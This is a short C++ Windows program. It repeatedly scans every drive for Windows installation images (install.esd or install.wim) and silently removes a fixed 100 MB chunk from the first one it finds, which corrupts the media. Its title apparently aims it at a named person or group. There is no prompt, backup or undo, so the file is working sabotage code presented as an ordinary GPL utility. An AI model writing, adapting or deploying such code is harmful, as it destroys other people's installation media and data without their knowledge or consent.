/*
 * Anti Fallah (seyyed ali)
 * Copyright (C) 2026 Muhammad Hossein
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

#include <windows.h>
#include <iostream>
#include <new>

const unsigned long long removeSize = 100000000;
const DWORD bufferSize = 16 * 1024 * 1024;

bool removeBytes(
    const char* filePath,
    unsigned long long requestedStart,
    unsigned long long requestedEnd
) {
    if (requestedStart >= requestedEnd) {
        std::cerr << "invalid requested range.\n";
        return false;
    }

    unsigned long long requestedSize =
    requestedEnd - requestedStart;

    if (requestedSize != removeSize) {
        std::cerr << "requested range must be exactly 100 mb.\n";
        return false;
    }

    HANDLE file = CreateFileA(
        filePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (file == INVALID_HANDLE_VALUE) {
        std::cerr << "cannot open file. error: "
        << GetLastError() << "\n";
        return false;
    }

    LARGE_INTEGER fileSize;

    if (!GetFileSizeEx(file, &fileSize)) {
        std::cerr << "cannot get file size.\n";
        CloseHandle(file);
        return false;
    }

    unsigned long long size =
    static_cast<unsigned long long>(fileSize.QuadPart);

    if (size < removeSize) {
        std::cerr << "file is smaller than 100 mb.\n";
        CloseHandle(file);
        return false;
    }

    unsigned long long start;
    unsigned long long end;

    if (requestedEnd <= size) {
        start = requestedStart;
        end = requestedEnd;

        std::cout << "requested range exists.\n";
    }
    else {
        start = size - removeSize;
        end = size;

        std::cout << "requested range does not exist.\n";
        std::cout << "removing last 100 mb instead.\n";
    }

    // if the bytes are at the end, we only need to make the file smaller
    if (end == size) {
        LARGE_INTEGER position;

        position.QuadPart = start;

        if (!SetFilePointerEx(
            file,
            position,
            nullptr,
            FILE_BEGIN
        )) {

            std::cerr << "failed to move file pointer. error: "
            << GetLastError() << "\n";

            CloseHandle(file);
            return false;
        }

        if (!SetEndOfFile(file)) {
            std::cerr << "failed to resize file. error: "
            << GetLastError() << "\n";

            CloseHandle(file);
            return false;
        }

        CloseHandle(file);

        std::cout << "100 mb removed from the end.\n";

        return true;
    }

    char* buffer = new (std::nothrow) char[bufferSize];

    if (buffer == nullptr) {
        std::cerr << "not enough memory.\n";
        CloseHandle(file);
        return false;
    }

    unsigned long long source = end;
    unsigned long long destination = start;

    unsigned long long remaining = size - end;

    while (remaining > 0) {

        DWORD amount;

        if (remaining > bufferSize)
            amount = bufferSize;
        else
            amount = static_cast<DWORD>(remaining);

        // move to the place where we want to read
        LARGE_INTEGER readPosition;
        readPosition.QuadPart = source;

        if (!SetFilePointerEx(
            file,
            readPosition,
            nullptr,
            FILE_BEGIN
        )) {

            std::cerr << "failed to move to read position.\n";

            delete[] buffer;
            CloseHandle(file);
            return false;
        }

        // read data
        DWORD bytesRead = 0;

        if (!ReadFile(
            file,
            buffer,
            amount,
            &bytesRead,
            nullptr
        )) {

            std::cerr << "failed to read file. error: "
            << GetLastError() << "\n";

            delete[] buffer;
            CloseHandle(file);
            return false;
        }

        if (bytesRead == 0) {
            std::cerr << "nothing was read from the file.\n";

            delete[] buffer;
            CloseHandle(file);
            return false;
        }

        // move to the place where we want to write
        LARGE_INTEGER writePosition;
        writePosition.QuadPart = destination;

        if (!SetFilePointerEx(
            file,
            writePosition,
            nullptr,
            FILE_BEGIN
        )) {

            std::cerr << "failed to move to write position.\n";

            delete[] buffer;
            CloseHandle(file);
            return false;
        }

        // write data
        DWORD bytesWritten = 0;

        if (!WriteFile(
            file,
            buffer,
            bytesRead,
            &bytesWritten,
            nullptr
        )) {

            std::cerr << "failed to write file. error: "
            << GetLastError() << "\n";

            delete[] buffer;
            CloseHandle(file);
            return false;
        }

        if (bytesWritten != bytesRead) {
            std::cerr << "not all data was written.\n";

            delete[] buffer;
            CloseHandle(file);
            return false;
        }

        source += bytesRead;
        destination += bytesWritten;
        remaining -= bytesRead;
    }

    delete[] buffer;

    // make the file 100 mb smaller
    LARGE_INTEGER newSize;
    newSize.QuadPart = size - removeSize;

    if (!SetFilePointerEx(
        file,
        newSize,
        nullptr,
        FILE_BEGIN
    )) {

        std::cerr << "failed to move to new file size.\n";

        CloseHandle(file);
        return false;
    }

    if (!SetEndOfFile(file)) {
        std::cerr << "failed to resize file. error: "
        << GetLastError() << "\n";

        CloseHandle(file);
        return false;
    }

    CloseHandle(file);

    std::cout << "exactly 100 mb removed successfully.\n";

    return true;
}

int main()
{
    const char* fileNames[] = {
        "install.esd",
        "install.wim"
    };

    while (true) {

        DWORD drives = GetLogicalDrives();

        if (drives == 0) {
            std::cerr << "failed to get logical drives. error: "
            << GetLastError() << "\n";

            Sleep(10000);
            continue;
        }

        char foundPath[MAX_PATH] = {};
        bool found = false;

        // check install.esd and install.wim
        for (int fileIndex = 0; fileIndex < 2; fileIndex++) {

            // check drives from a to z
            for (char drive = 'A'; drive <= 'Z'; drive++) {

                // check if this drive exists
                if (!(drives & (1u << (drive - 'A'))))
                    continue;

                char path[MAX_PATH] = {};

                sprintf_s(
                    path,
                    "%c:\\sources\\%s",
                    drive,
                    fileNames[fileIndex]
                );

                DWORD attributes = GetFileAttributesA(path);

                if (
                    attributes != INVALID_FILE_ATTRIBUTES &&
                    !(attributes & FILE_ATTRIBUTE_DIRECTORY)
                ) {
                    strcpy_s(foundPath, path);
                    found = true;
                    break;
                }
            }

            if (found)
                break;
        }

        if (!found) {
            std::cout
            << "neither install.esd nor install.wim was found.\n";

            std::cout
            << "checking again in 10 seconds...\n";

            Sleep(10000);
            continue;
        }

        std::cout << "found: " << foundPath << "\n";

        bool result = removeBytes(
            foundPath,
            4000000000ULL,
            4100000000ULL
        );

        if (result) {
            std::cout
            << "bytes removed successfully from: "
            << foundPath << "\n";
        }
        else {
            std::cerr
            << "failed to modify: "
            << foundPath << "\n";
        }

        break;
    }

    return 0;
}

/*
 * dear programmer:
 *
 * when i wrote this code, only god and i knew how it worked.
 * now, god only knows.
 *
 * if you are trying to optimize this routine and it fails,
 * please increase the following counter:
 *
 * total_hours_wasted_here = 16;
 *
 * then leave this code alone.
 */
